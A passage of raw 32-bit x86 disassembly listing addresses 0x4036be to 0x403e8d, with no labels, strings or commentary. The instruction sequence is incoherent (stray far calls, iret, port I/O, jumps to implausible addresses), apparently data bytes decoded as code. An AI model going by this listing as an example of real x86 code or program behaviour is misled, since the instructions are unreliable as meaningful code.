  4036be:	add    DWORD PTR [eax],eax
  4036c0:	or     BYTE PTR [eax],al
  4036c2:	mov    DWORD PTR [ecx],ebp
  4036c4:	loopne 0x40364d
  4036c6:	xchg   ebp,eax
  4036c7:	mov    cl,0x70
  4036c9:	inc    edi
  4036ca:	inc    eax
  4036cb:	sbb    BYTE PTR [eax],cl
  4036cd:	add    BYTE PTR [ebx+0x10],al
  4036d0:	sbb    DWORD PTR [ecx-0x6dd57c00],eax
  4036d6:	and    BYTE PTR [edx+0x12411000],ah
  4036dc:	adc    DWORD PTR [eax+eax*4+0x10453c10],edx
  4036e3:	or     eax,DWORD PTR [eiz*1+0x13405622]
  4036ea:	add    BYTE PTR [eax+0x20020508],ah
  4036f0:	add    BYTE PTR [eax-0x80],al
  4036f3:	sbb    al,0xe8
  4036f5:	add    DWORD PTR [edi],0x414001c2
  4036fb:	add    BYTE PTR [ecx],al
  4036fd:	cmp    BYTE PTR [eax],al
  4036ff:	bound  edx,QWORD PTR [ecx]
  403701:	xchg   ecx,eax
  403702:	add    al,BYTE PTR ds:0x81e4080
  403708:	push   eax
  403709:	test   BYTE PTR [eax],cl
  40370b:	loope  0x40368d
  40370d:	sbb    al,0x4
  40370f:	pop    es
  403710:	add    BYTE PTR [eax],al
  403712:	ins    BYTE PTR es:[edi],dx
  403713:	adc    BYTE PTR [eax-0x5bbfea77],ch
  403719:	adc    BYTE PTR [eax+0x46],al
  40371c:	jle    0x40373a
  40371e:	test   eax,0x92585801
  403723:	scas   al,BYTE PTR es:[edi]
  403724:	add    BYTE PTR [edx],dl
  403726:	or     dh,BYTE PTR [edx]
  403728:	call   DWORD PTR ds:0x43805c
  40372e:	or     DWORD PTR [edx+0x400441],esi
  403734:	call   0x41d:0x88001a2
  40373b:	add    BYTE PTR [ebp+0x0],ah
  40373e:	adc    DWORD PTR [eax],0x80702843
  403744:	add    eax,DWORD PTR [esp+eax*1+0x100b8040]
  40374b:	inc    edi
  40374c:	pop    ss
  40374d:	or     BYTE PTR [ecx],ah
  40374f:	add    bl,BYTE PTR [eax+ebx*2]
  403752:	add    al,0x0
  403754:	add    al,0xa0
  403756:	and    DWORD PTR [esi+eax*1],eax
  403759:	and    BYTE PTR [esi-0x56d6ef00],dh
  40375f:	and    al,BYTE PTR [esi+0x20284922]
  403765:	add    BYTE PTR [eax+ecx*8],0x1d
  403769:	mov    BYTE PTR [ebx],ah
  40376b:	sub    al,0x22
  40376d:	fadd   DWORD PTR [eax]
  40376f:	lea    eax,[ecx]
  403771:	xor    BYTE PTR [ecx+0x41116218],dl
  403777:	adc    al,0x60
  403779:	add    BYTE PTR [ecx+eax*1],0x90
  40377d:	ret    0x440
  403780:	add    dh,BYTE PTR [eax+0x4d150820]
  403786:	add    al,BYTE PTR [ecx+0x1b0c00b]
  40378c:	cwde   
  40378d:	adc    DWORD PTR [edx+0x1c404c00],eax
  403793:	inc    ecx
  403794:	add    BYTE PTR [ecx+0x22202032],al
  40379a:	aad    0x1
  40379c:	add    BYTE PTR [eax],0xcc
  40379f:	add    DWORD PTR [ebx+eax*4],ecx
  4037a2:	and    al,al
  4037a4:	add    BYTE PTR [eax],al
  4037a6:	mov    BYTE PTR [eax+eiz*1],cl
  4037a9:	or     BYTE PTR [ecx-0x6d7f5bec],ch
  4037af:	adc    al,0x0
  4037b1:	adc    al,0x60
  4037b4:	add    al,BYTE PTR [eax]
  4037b6:	mov    DWORD PTR [edx],edx
  4037b8:	and    eax,0x4167004
  4037bd:	add    al,dl
  4037bf:	pusha  
  4037c0:	adc    al,0xc4
  4037c2:	adc    ah,BYTE PTR [eax]
  4037c4:	adc    DWORD PTR [eax+eiz*4],eax
  4037c7:	add    BYTE PTR [ecx+0x1855916],bl
  4037cd:	daa    
  4037ce:	and    al,BYTE PTR [eax+edx*1]
  4037d1:	cmp    BYTE PTR es:[ecx-0x77f5e9e0],cl
  4037d8:	ror    BYTE PTR [esp+eax*1],1
  4037db:	inc    ecx
  4037dc:	and    ah,ah
  4037de:	lea    ebp,[eax]
  4037e0:	add    BYTE PTR [eax-0x7e],dh
  4037e3:	xlat   BYTE PTR ds:[ebx]
  4037e4:	lds    eax,FWORD PTR [eax-0x30]
  4037e7:	dec    eax
  4037e8:	add    BYTE PTR [ecx],al
  4037ea:	xor    BYTE PTR [edx+ecx*4],0x4
  4037ee:	nop
  4037ef:	push   es
  4037f0:	adc    eax,0xe300022c
  4037f5:	add    BYTE PTR ds:0x46009000,0x1
  4037fc:	mov    al,ds:0x400044e9
  403801:	sbb    al,BYTE PTR [eax]
  403803:	adc    BYTE PTR [eax+eiz*2-0x3edc6eed],0x0
  40380b:	mov    BYTE PTR [eax],dl
  40380d:	add    BYTE PTR [eax+0x7],al
  403810:	inc    ecx
  403811:	add    BYTE PTR [esp+ecx*1-0x3fdf2ffd],dl
  403818:	push   es
  403819:	sbb    BYTE PTR [ebx],ah
  40381b:	les    esi,FWORD PTR [ecx+0x0]
  40381e:	pusha  
  40381f:	xchg   edx,eax
  403820:	adc    BYTE PTR [eax],al
  403822:	xor    al,0x14
  403824:	inc    esp
  403825:	add    al,BYTE PTR [ecx+0x1048a00b]
  40382b:	add    BYTE PTR [eax],ah
  40382d:	add    al,0x1c
  40382f:	and    DWORD PTR [ecx],esi
  403831:	and    al,0x0
  403833:	adc    BYTE PTR [esi*1+0xa12d09],al
  40383a:	inc    ecx
  40383b:	sub    al,0x12
  40383d:	adc    BYTE PTR [ecx+eax*1],al
  403840:	nop
  403841:	test   DWORD PTR [esi+0x4],ecx
  403844:	mov    DWORD PTR [ecx+0xb],esp
  403847:	add    al,0xc2
  403849:	adc    al,0x85
  40384b:	inc    eax
  40384c:	push   ebp
  40384d:	and    al,0x28
  40384f:	cwde   
  403850:	adc    al,0x1
  403852:	mov    bl,BYTE PTR [eax]
  403854:	push   cs
  403855:	sub    al,0x30
  403857:	loopne 0x40385f
  403859:	adc    BYTE PTR [eax],dl
  40385b:	add    BYTE PTR [eax+0x0],al
  40385e:	bound  edi,QWORD PTR [eax]
  403860:	adc    al,BYTE PTR [edx]
  403862:	or     bl,ch
  403864:	adc    al,0x18
  403866:	cwde   
  403867:	or     BYTE PTR [eax],cl
  403869:	inc    eax
  40386a:	and    BYTE PTR [ecx],cl
  40386c:	inc    eax
  40386d:	adc    ah,BYTE PTR [eax+edx*1]
  403870:	add    eax,DWORD PTR [edx+0x19014900]
  403876:	adc    DWORD PTR [ecx-0x7fdbe9e0],0xf82391
  403880:	adc    DWORD PTR [edi],eax
  403882:	adc    eax,0x8022021
  403887:	add    BYTE PTR [ebx+0x10],0x2a
  40388b:	test   al,0x2
  40388d:	mov    dl,0x0
  40388f:	adc    BYTE PTR [esi+ecx*1],bl
  403892:	xor    al,0x4
  403894:	mov    DWORD PTR [eax+0x24000433],ebx
  40389a:	add    DWORD PTR [eax],edx
  40389c:	pop    ss
  40389d:	mov    BYTE PTR [eax+0x39],bh
  4038a0:	mov    al,ds:0x2a038822
  4038a5:	sub    DWORD PTR ds:0x6803010a,esi
  4038ab:	add    BYTE PTR [eax],cl
  4038ad:	add    al,0x41
  4038af:	inc    edx
  4038b0:	and    eax,DWORD PTR [eax]
  4038b2:	jo     0x403844
  4038b4:	ins    DWORD PTR es:[edi],dx
  4038b5:	mov    al,BYTE PTR [ebx]
  4038b7:	or     BYTE PTR [ebx],al
  4038b9:	sbb    BYTE PTR [edx-0x7aeb3bbd],0x21
  4038c0:	push   es
  4038c1:	add    eax,edi
  4038c3:	adc    al,0x64
  4038c5:	cmp    DWORD PTR [eax+0xc],0x1120a069
  4038cc:	add    cl,BYTE PTR [ecx+0x0]
  4038cf:	sub    cl,BYTE PTR [ebp-0x2f]
  4038d2:	test   DWORD PTR [eax],edx
  4038d4:	and    DWORD PTR [esi],eax
  4038d6:	mov    BYTE PTR [ecx-0x1f],ch
  4038d9:	inc    ebx
  4038da:	or     al,BYTE PTR [eax]
  4038dc:	dec    ebx
  4038dd:	adc    ch,BYTE PTR [eax]
  4038df:	or     al,dl
  4038e1:	data16 xor BYTE PTR [ecx],ah
  4038e4:	xor    ecx,DWORD PTR [eax+eiz*1]
  4038e7:	mov    al,0x76
  4038e9:	adc    bl,al
  4038eb:	or     al,0x80
  4038ed:	add    BYTE PTR gs:[eax],al
  4038f0:	inc    edx
  4038f1:	or     al,0x18
  4038f3:	inc    esp
  4038f4:	add    BYTE PTR [edx],0x14
  4038f7:	and    al,0x49
  4038f9:	sub    DWORD PTR [esi+0x2],eax
  4038fc:	test   BYTE PTR [eax],al
  4038fe:	inc    eax
  4038ff:	dec    ecx
  403900:	and    BYTE PTR [eax],0x24
  403903:	dec    ecx
  403904:	push   0x37510508
  403909:	mov    al,ds:0x5e01c259
  40390e:	test   DWORD PTR [edx],ecx
  403910:	and    BYTE PTR [eax],cl
  403912:	jl     0x403916
  403914:	or     al,0x40
  403916:	dec    eax
  403917:	add    BYTE PTR [eax],ah
  403919:	add    BYTE PTR [eax],al
  40391b:	xchg   esp,eax
  40391c:	mov    ds:0x14001504,eax
  403921:	rol    BYTE PTR [edx],1
  403923:	add    BYTE PTR [eax],dl
  403925:	mov    cl,BYTE PTR [ecx]
  403927:	jo     0x403969
  403929:	adc    ecx,ebx
  40392b:	push   eax
  40392c:	sub    dl,BYTE PTR [ecx]
  40392e:	bound  eax,QWORD PTR [eax]
  403930:	add    eax,0xd2004210
  403935:	xchg   ecx,eax
  403936:	lock or ah,BYTE PTR [ecx]
  403939:	loopne 0x40397f
  40393b:	mov    al,ds:0x6404186
  403940:	xchg   esp,eax
  403941:	and    DWORD PTR [eax+0x31],eax
  403944:	jmp    0x403950
  403946:	add    al,ch
  403948:	sbb    al,0x88
  40394a:	xor    DWORD PTR [eax],eax
  40394c:	add    BYTE PTR [esi],al
  40394e:	and    al,0x2
  403950:	add    DWORD PTR [ebx-0x74ff77fa],ecx
  403956:	rol    BYTE PTR [eax],0x90
  403959:	cmp    BYTE PTR [ecx+ebp*2],cl
  40395c:	sub    DWORD PTR [esp+eax*1-0x7f],ebx
  403960:	or     al,0x80
  403962:	pop    edx
  403963:	mov    al,ds:0x2c14a150
  403968:	test   BYTE PTR [eax+eiz*4],dl
  40396b:	or     cl,BYTE PTR [eax+0x5016c00]
  403971:	sub    BYTE PTR [esp+ecx*2],ah
  403974:	xor    BYTE PTR [ecx+0x48414400],ah
  40397a:	enter  0x762,0x2
  40397e:	push   eax
  40397f:	mov    BYTE PTR [ecx],ah
  403981:	push   es
  403982:	and    BYTE PTR [edx-0x58],0x0
  403986:	and    BYTE PTR [esi+0x46],dh
  403989:	dec    esp
  40398a:	inc    eax
  40398b:	mov    al,0x31
  40398d:	ror    BYTE PTR [ecx+eax*1],1
  403990:	and    BYTE PTR [ecx+eax*1-0x79],0x2
  403995:	iret   
  403996:	cmp    BYTE PTR [eax+0x81b140],0x20
  40399d:	add    BYTE PTR [eax-0x60],0xc1
  4039a1:	add    BYTE PTR [eax],ah
  4039a3:	inc    eax
  4039a4:	ror    DWORD PTR [eax+eax*4],0x1c
  4039a8:	add    al,0x9
  4039aa:	pusha  
  4039ab:	and    BYTE PTR [eax],dl
  4039ad:	sbb    BYTE PTR [eax+edx*2],al
  4039b0:	dec    esp
  4039b1:	cmp    BYTE PTR [ebp+0x1],bl
  4039b4:	shl    DWORD PTR [eax],0x1
  4039b7:	sub    DWORD PTR [eax],0x8051001
  4039bd:	nop
  4039be:	or     BYTE PTR [eax+edx*2],cl
  4039c1:	xor    BYTE PTR [edx],ch
  4039c3:	add    DWORD PTR [eax-0x78],edx
  4039c6:	adc    al,BYTE PTR [edi+eax*4]
  4039c9:	push   esp
  4039ca:	add    BYTE PTR [eax+ecx*4+0xc],ah
  4039ce:	inc    eax
  4039cf:	inc    eax
  4039d0:	add    al,BYTE PTR [ebx]
  4039d2:	add    DWORD PTR [edx],eax
  4039d4:	push   eax
  4039d5:	pop    ds
  4039d6:	rol    BYTE PTR [eax],1
  4039d8:	mov    fs,WORD PTR [esp+ecx*2]
  4039db:	and    al,BYTE PTR [esi]
  4039dd:	int3   
  4039de:	mov    BYTE PTR [ebx+0x10274060],ah
  4039e4:	inc    eax
  4039e5:	add    BYTE PTR [eax+0x9],cl
  4039e8:	daa    
  4039e9:	pusha  
  4039ea:	or     BYTE PTR ds:0x58084308,al
  4039f0:	xor    BYTE PTR [eax+eiz*2],al
  4039f3:	add    eax,DWORD PTR [eax+eax*1]
  4039f6:	dec    ecx
  4039f7:	test   BYTE PTR [ecx],al
  4039f9:	loopne 0x403a27
  4039fb:	add    BYTE PTR [eax],ah
  4039fd:	les    edx,FWORD PTR es:[ecx]
  403a00:	mov    edi,0xb2121a9
  403a05:	sub    al,0x2
  403a07:	inc    ebx
  403a08:	add    BYTE PTR [eax+0x18],dl
  403a0b:	add    BYTE PTR [eax],cl
  403a0d:	inc    ecx
  403a0e:	sub    BYTE PTR [ecx-0x7fe99f6c],al
  403a14:	sub    BYTE PTR [ebx],ch
  403a16:	xchg   DWORD PTR ds:0x58885040,esp
  403a1c:	add    al,0xa0
  403a1e:	and    BYTE PTR [eax+eax*1],dh
  403a21:	inc    ecx
  403a22:	add    BYTE PTR [eax+0x1047a48],ch
  403a28:	inc    ecx
  403a29:	dec    esp
  403a2a:	and    eax,DWORD PTR [eax+eax*2+0x0]
  403a2e:	or     BYTE PTR [edi+0x16],al
  403a31:	add    BYTE PTR [esi+0x0],ah
  403a34:	aam    0x6
  403a36:	add    BYTE PTR [edx],cl
  403a38:	add    cl,BYTE PTR [eax]
  403a3a:	add    al,BYTE PTR [eax]
  403a3c:	add    al,BYTE PTR [eax]
  403a3e:	es nop
  403a40:	lods   al,BYTE PTR ds:[esi]
  403a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a42:	add    BYTE PTR [eax+0x0],cl
  403a45:	inc    ecx
  403a46:	xor    BYTE PTR [ecx+0x2091c2],al
  403a4c:	dec    eax
  403a4d:	mov    al,ds:0x88000853
  403a52:	add    al,0x11
  403a54:	adc    BYTE PTR [eax],0x80
  403a57:	adc    al,0x48
  403a59:	inc    eax
  403a5a:	sbb    al,BYTE PTR [eax]
  403a5c:	adc    BYTE PTR [eax],al
  403a5e:	or     BYTE PTR [eax],0x99
  403a61:	shl    BYTE PTR [eax+0x38],0x60
  403a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a66:	add    BYTE PTR [eax],al
  403a68:	dec    esp
  403a69:	sbb    al,0x8
  403a6b:	add    DWORD PTR [esp+0x4],eax
  403a6f:	add    DWORD PTR [edx],eax
  403a71:	lea    eax,[eax+0x0]
  403a74:	dec    edx
  403a75:	sub    BYTE PTR [ecx],0x0
  403a78:	sbb    DWORD PTR [eax],esi
  403a7a:	adc    eax,0x2030881a
  403a7f:	adc    DWORD PTR [eax+eiz*1+0x10081],eax
  403a86:	ss jmp 0x151bccf
  403a8c:	add    ah,BYTE PTR [ecx]
  403a8e:	add    BYTE PTR [esi-0x3c],ah
  403a91:	add    BYTE PTR [ecx],ah
  403a93:	push   eax
  403a94:	cwde   
  403a95:	add    al,0x38
  403a97:	and    BYTE PTR [eax],ch
  403a99:	push   ecx
  403a9a:	or     al,BYTE PTR [edx]
  403a9c:	add    eax,0x80c98414
  403aa1:	inc    eax
  403aa2:	test   cl,ah
  403aa4:	push   eax
  403aa5:	test   BYTE PTR [eax-0x63bde7af],al
  403aab:	in     al,0x2c
  403aad:	nop
  403aae:	dec    eax
  403aaf:	inc    eax
  403ab0:	mov    al,ds:0x28834504
  403ab5:	add    DWORD PTR [eax+0x7d],esp
  403ab8:	inc    eax
  403ab9:	add    BYTE PTR [eax],ch
  403abb:	test   cl,al
  403abd:	jmp    0x80404b62
  403ac2:	mov    al,ds:0x140cbe20
  403ac7:	push   es
  403ac8:	and    BYTE PTR [eax],0xb8
  403acb:	push   esp
  403acc:	jo     0x403af4
  403ace:	mov    BYTE PTR [edx-0x80],al
  403ad1:	inc    ebp
  403ad2:	or     BYTE PTR [eax-0x3f],ah
  403ad5:	sbb    BYTE PTR [edx],al
  403ad7:	rol    DWORD PTR [eax+0x1],0xa2
  403adb:	jo     0x403b45
  403add:	aad    0x82
  403adf:	adc    al,0x85
  403ae1:	adc    DWORD PTR [edx+eiz*1],0x0
  403ae5:	add    BYTE PTR [eax-0x7bf77bd6],dl
  403aeb:	add    DWORD PTR ds:0x50000804,eax
  403af1:	or     BYTE PTR [ebx*4+0x5280a002],dl
  403af8:	add    BYTE PTR [eax],ah
  403afa:	pusha  
  403afb:	add    DWORD PTR [eax],0xc65891
  403b01:	adc    BYTE PTR ds:0x102148,ah
  403b07:	xor    eax,0x50250120
  403b0c:	add    al,0x10
  403b0e:	adc    BYTE PTR [eax+esi*2+0x34],dl
  403b12:	adc    BYTE PTR [ebp+0x48320008],cl
  403b18:	push   ds
  403b19:	adc    BYTE PTR [eax+0x411206],al
  403b1f:	add    BYTE PTR [esi-0x18],0x90
  403b23:	adc    BYTE PTR [eax-0x7f9fcd33],0x80
  403b2a:	adc    edi,DWORD PTR [eax]
  403b2c:	ins    BYTE PTR es:[edi],dx
  403b2d:	inc    edx
  403b2e:	pop    es
  403b2f:	sbb    al,0x0
  403b31:	mov    dl,0xc1
  403b33:	add    al,BYTE PTR fs:[eax+ecx*1]
  403b37:	add    BYTE PTR [ecx],cl
  403b39:	les    eax,FWORD PTR [eax]
  403b3b:	add    BYTE PTR [esp+eax*1],dl
  403b3e:	inc    eax
  403b3f:	or     eax,0x1217448
  403b44:	cmp    BYTE PTR [eax+eax*1],dh
  403b47:	add    al,0x4
  403b49:	add    BYTE PTR [ebp+0x45],al
  403b4c:	cdq    
  403b4d:	sbb    DWORD PTR [edx-0x40],esi
  403b50:	add    BYTE PTR [edx+eax*4+0x2a8014c5],0x24
  403b58:	inc    edx
  403b59:	add    cl,BYTE PTR [edx]
  403b5b:	add    BYTE PTR [ecx],0x4c
  403b5e:	inc    edx
  403b5f:	adc    DWORD PTR [eax-0x60],esp
  403b62:	add    BYTE PTR [edi],al
  403b64:	mov    BYTE PTR [ecx],ch
  403b66:	or     BYTE PTR [edx],0x46
  403b69:	mov    DWORD PTR [ecx+0x30046130],eax
  403b6f:	cmp    al,0xa
  403b71:	add    DWORD PTR [eax+0x2],esp
  403b74:	and    al,0x2
  403b76:	add    BYTE PTR [esi+0x2c00213],0x41
  403b7d:	sbb    BYTE PTR [eax],al
  403b7f:	or     dl,BYTE PTR [eax-0x80]
  403b82:	inc    edx
  403b83:	and    BYTE PTR ss:[eax+0x20141600],ah
  403b8a:	sbb    cl,BYTE PTR [edx+0x0]
  403b8d:	add    BYTE PTR [edx+ecx*4+0x68b0],al
  403b94:	adc    DWORD PTR [ebx+0x2254540f],0x9c608001
  403b9e:	add    BYTE PTR [ecx],dl
  403ba0:	inc    eax
  403ba1:	add    al,al
  403ba3:	add    BYTE PTR [ecx],al
  403ba5:	and    cl,al
  403ba7:	inc    esp
  403ba8:	inc    ebp
  403ba9:	xor    BYTE PTR [eax+edx*2],al
  403bac:	mov    WORD PTR [eax],ds
  403bae:	and    cl,BYTE PTR [ecx]
  403bb0:	xchg   esp,eax
  403bb1:	out    0x39,al
  403bb3:	mov    ds:0xe4c004a0,al
  403bb8:	inc    esp
  403bb9:	add    DWORD PTR [edi+0x1802ad],esp
  403bbf:	add    eax,0x84300700
  403bc4:	ret    
  403bc5:	inc    eax
  403bc6:	add    BYTE PTR [ebp+0x18],ah
  403bc9:	and    BYTE PTR [eax],al
  403bcb:	add    BYTE PTR [eax],ah
  403bcd:	add    DWORD PTR [eax+0xb004],eax
  403bd3:	and    al,0x15
  403bd5:	cmp    BYTE PTR [ecx+0x9012399],0x10
  403bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bdd:	xor    al,0x29
  403bdf:	add    DWORD PTR [eax+0x4],ecx
  403be2:	inc    edx
  403be3:	add    DWORD PTR [edi],ebx
  403be5:	add    BYTE PTR [eax+0x4889010],ah
  403beb:	add    al,0x4
  403bed:	inc    eax
  403bee:	and    BYTE PTR [ebx],dl
  403bf0:	mov    ebp,0x46c4a010
  403bf5:	pusha  
  403bf6:	adc    ah,cl
  403bf8:	add    BYTE PTR [eax],al
  403bfa:	mov    eax,ds:0x41420010
  403bff:	sbb    al,ah
  403c01:	push   eax
  403c02:	xor    DWORD PTR [eax+edx*4],eax
  403c05:	adc    BYTE PTR [esp+edx*8],al
  403c08:	pop    eax
  403c09:	add    DWORD PTR [ecx],eax
  403c0b:	or     BYTE PTR [eax],cl
  403c0d:	pushf  
  403c0e:	dec    eax
  403c0f:	adc    al,0xc5
  403c11:	mov    al,ds:0xa1200348
  403c16:	inc    eax
  403c17:	sbb    BYTE PTR [eax-0x7e],al
  403c1a:	add    BYTE PTR ds:0x21410588,0x47
  403c21:	xchg   ebp,eax
  403c22:	xor    ah,BYTE PTR [esp+eiz*2]
  403c25:	adc    eax,0xb400248
  403c2a:	and    DWORD PTR [ebx-0x69b48000],esp
  403c30:	rol    BYTE PTR ds:0x201bac20,0x2c
  403c37:	adc    eax,0x90014c2
  403c3c:	cmp    al,0x22
  403c3e:	add    BYTE PTR [eax],al
  403c40:	and    eax,0x2d1d1c00
  403c45:	add    BYTE PTR [ecx+0x3808470f],cl
  403c4b:	ret    
  403c4c:	adc    al,BYTE PTR [edx]
  403c4e:	add    BYTE PTR ds:0x1a620c1,al
  403c54:	add    eax,DWORD PTR [eax-0x3fffbc78]
  403c5a:	adc    BYTE PTR [edx],dh
  403c5c:	add    eax,DWORD PTR [edx]
  403c5e:	add    BYTE PTR [eax+0x25],al
  403c61:	ret    
  403c62:	and    BYTE PTR [eax],dl
  403c64:	pusha  
  403c65:	inc    eax
  403c66:	push   ecx
  403c67:	sbb    BYTE PTR [eax],cl
  403c69:	or     BYTE PTR gs:[ecx-0x3e],al
  403c6d:	sub    BYTE PTR [ecx],ah
  403c6f:	and    al,0xb0
  403c71:	adc    al,0x64
  403c73:	add    DWORD PTR [eax+0x40],ecx
  403c76:	aaa    
  403c77:	dec    eax
  403c78:	adc    DWORD PTR [edx],eax
  403c7a:	mov    al,0xc4
  403c7c:	add    DWORD PTR [eax+0x16],eax
  403c7f:	inc    ecx
  403c80:	add    BYTE PTR [eax],dl
  403c82:	test   DWORD PTR [ebp+0x24a6c235],edx
  403c88:	nop
  403c89:	dec    esp
  403c8a:	adc    DWORD PTR [edi],eax
  403c8c:	dec    eax
  403c8d:	add    DWORD PTR [edx+eiz*2],edx
  403c90:	add    eax,0x42d1454
  403c95:	adc    BYTE PTR [esi],dl
  403c97:	or     BYTE PTR [eax-0x6fdf7f5c],cl
  403c9d:	mov    eax,ds:0xe0408010
  403ca2:	or     DWORD PTR [esp+eiz*4-0x74],ebp
  403ca6:	add    BYTE PTR [edx-0x6f],al
  403ca9:	push   0x3a03225
  403cae:	add    BYTE PTR [eax],al
  403cb0:	add    BYTE PTR [eax],cl
  403cb2:	dec    esp
  403cb3:	data16 add BYTE PTR [eax+0x3],bh
  403cb7:	adc    eax,0x4c520900
  403cbc:	mov    al,ds:0x1004c352
  403cc1:	add    ecx,eax
  403cc3:	rol    BYTE PTR [esp+ebx*4],1
  403cc6:	int3   
  403cc7:	add    cl,BYTE PTR [eax+0x14808440]
  403ccd:	and    al,0x8
  403ccf:	and    al,BYTE PTR [ebx+eiz*2]
  403cd2:	and    al,0x8
  403cd4:	add    al,0xb2
  403cd6:	xchg   ebp,eax
  403cd7:	add    DWORD PTR [ecx+0x20110b2c],eax
  403cdd:	add    DWORD PTR [edx-0x7e],edx
  403ce0:	adc    ah,BYTE PTR [eax+eax*1]
  403ce3:	dec    esp
  403ce4:	sbb    al,0x40
  403ce6:	push   esp
  403ce7:	nop
  403ce8:	test   BYTE PTR [edx-0x735b7d7b],cl
  403cee:	add    cl,al
  403cf0:	adc    DWORD PTR [ecx],eax
  403cf2:	popa   
  403cf3:	adc    eax,0x44c5a08
  403cf8:	and    al,0x3
  403cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cfb:	add    edx,DWORD PTR [eax+0x2]
  403cfe:	mov    BYTE PTR [esi],dl
  403d00:	and    BYTE PTR [eax],al
  403d02:	add    DWORD PTR [ebx+0x5],edx
  403d05:	retf   0xb
  403d08:	adc    DWORD PTR [esi+0x19],0x20c4c04
  403d0f:	push   eax
  403d10:	adc    BYTE PTR [eax],al
  403d12:	or     ch,al
  403d14:	add    BYTE PTR [ebx+edi*1],dl
  403d17:	mov    al,ds:0x20a90a02
  403d1c:	and    BYTE PTR [edx+0x44],al
  403d1f:	add    al,0x13
  403d21:	add    al,al
  403d23:	outs   dx,BYTE PTR ds:[esi]
  403d24:	mov    al,ds:0x900c0045
  403d29:	and    BYTE PTR [eax],al
  403d2b:	add    BYTE PTR [ecx+0x14],al
  403d2e:	add    DWORD PTR [ecx-0x6c],eax
  403d31:	and    BYTE PTR [ecx+eax*1],0x84
  403d35:	mov    al,ds:0x422c100d
  403d3a:	enter  0xe060,0x82
  403d3e:	adc    BYTE PTR [edx],bh
  403d40:	add    BYTE PTR [eax],dl
  403d42:	les    esp,FWORD PTR [ecx+0x3903581]
  403d48:	call   0x1280:0x201080cd
  403d4f:	and    BYTE PTR [ebx],ah
  403d51:	adc    BYTE PTR [eax],0x12
  403d54:	add    al,0x9b
  403d56:	nop
  403d57:	pusha  
  403d58:	outs   dx,BYTE PTR ds:[esi]
  403d59:	and    BYTE PTR [eax],dl
  403d5b:	leave  
  403d5c:	add    DWORD PTR [esi-0x60],0xb5022000
  403d63:	and    cl,BYTE PTR [eax]
  403d65:	mov    ds:0x31e23c1,eax
  403d6a:	sub    BYTE PTR [ebx+edx*1],al
  403d6d:	push   edx
  403d6e:	add    BYTE PTR [eax+eax*4+0x35b10059],al
  403d75:	rol    BYTE PTR [eax+ecx*8],1
  403d78:	add    al,BYTE PTR [ebx]
  403d7a:	rol    DWORD PTR [edx+eiz*1+0x3],0x10
  403d7f:	add    al,cl
  403d81:	add    BYTE PTR [ecx+0x1e200091],ah
  403d87:	or     al,0x88
  403d89:	rol    BYTE PTR [eax+edx*2],0x80
  403d8d:	or     al,0x8
  403d8f:	add    al,0x10
  403d91:	add    cl,BYTE PTR [edx+0x69330c11]
  403d97:	pop    edx
  403d98:	or     al,BYTE PTR [edx+eax*1+0x40]
  403d9c:	xor    DWORD PTR [ecx],ebp
  403d9e:	add    BYTE PTR [eax],cl
  403da0:	add    BYTE PTR [edx],al
  403da2:	or     DWORD PTR [eax],0x4401800
  403da8:	cwde   
  403da9:	stos   BYTE PTR es:[edi],al
  403daa:	xor    BYTE PTR [esi],al
  403dac:	and    DWORD PTR [ebx+ecx*1],eax
  403daf:	inc    edx
  403db0:	jno    0x403d74
  403db2:	and    BYTE PTR [ecx+0x47092002],cl
  403db8:	inc    eax
  403db9:	add    BYTE PTR [eax],0x0
  403dbc:	and    eax,DWORD PTR [edx+eax*1+0x802082]
  403dc3:	inc    ebx
  403dc4:	pusha  
  403dc5:	sbb    esi,DWORD PTR [edx+0x202a50a6]
  403dcb:	or     cl,BYTE PTR [edx]
  403dcd:	adc    BYTE PTR [eax+0x4a288402],bl
  403dd3:	rol    BYTE PTR [eax],0x10
  403dd6:	add    al,0x0
  403dd8:	call   0x8045:0x78ac0401
  403ddf:	pop    ds
  403de0:	inc    esp
  403de1:	add    DWORD PTR [eax],edx
  403de3:	xor    DWORD PTR [eax],0xc0881002
  403de9:	scas   al,BYTE PTR es:[edi]
  403dea:	add    ch,ah
  403dec:	add    al,ch
  403dee:	mov    BYTE PTR [ecx+0x10004016],al
  403df4:	add    al,0x90
  403df6:	test   eax,0x40114200
  403dfb:	dec    esi
  403dfc:	add    BYTE PTR [esi+eax*2],ah
  403dff:	add    BYTE PTR [eax],0x18
  403e02:	sbb    bl,BYTE PTR [edx+0x2804046d]
  403e08:	mov    DWORD PTR [edi+0x44a30080],esp
  403e0e:	dec    edx
  403e0f:	mov    eax,ds:0x80040410
  403e14:	sbb    DWORD PTR [eax+0x5100145c],ebp
  403e1a:	and    BYTE PTR [ecx],dh
  403e1c:	sbb    BYTE PTR [eax],cl
  403e1e:	adc    eax,0x84088809
  403e23:	and    al,0x11
  403e25:	sbb    BYTE PTR [ecx+0x1],dh
  403e28:	enter  0x8292,0x41
  403e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e2d:	xor    al,0x14
  403e2f:	xor    BYTE PTR [ecx],al
  403e31:	inc    eax
  403e32:	add    eax,0x4f400200
  403e37:	and    BYTE PTR [eax+0x44],dl
  403e3a:	add    dl,BYTE PTR [eax]
  403e3c:	adc    DWORD PTR [eax+0x1182d4c0],0x84208808
  403e46:	adc    BYTE PTR [eax+0xc35008],al
  403e4c:	add    BYTE PTR [eax+0x62],al
  403e4f:	or     al,0xb
  403e51:	sub    ah,ch
  403e53:	push   es
  403e54:	add    eax,0x1800651
  403e59:	add    BYTE PTR [eax+eax*2+0x391d2000],0x1
  403e61:	test   BYTE PTR [eax+0x10],al
  403e64:	ss add al,0xc
  403e67:	push   esi
  403e68:	add    BYTE PTR [ecx],cl
  403e6a:	sub    ah,BYTE PTR [ecx]
  403e6c:	xchg   ecx,eax
  403e6d:	or     al,0x2
  403e6f:	add    BYTE PTR [ebp+0x43],al
  403e72:	or     BYTE PTR [ebx],0x28
  403e75:	mov    dl,0xd
  403e77:	mov    ah,0x83
  403e79:	add    BYTE PTR [edx*4-0x68bfffbb],al
  403e80:	mov    al,ds:0x4e4a413
  403e85:	add    BYTE PTR [eax],cl
  403e87:	push   edx
  403e88:	add    al,0xa9
  403e8a:	adc    al,0x40
  403e8c:	inc    esp
  403e8d:	adc    DWORD PTR [ebx],eax
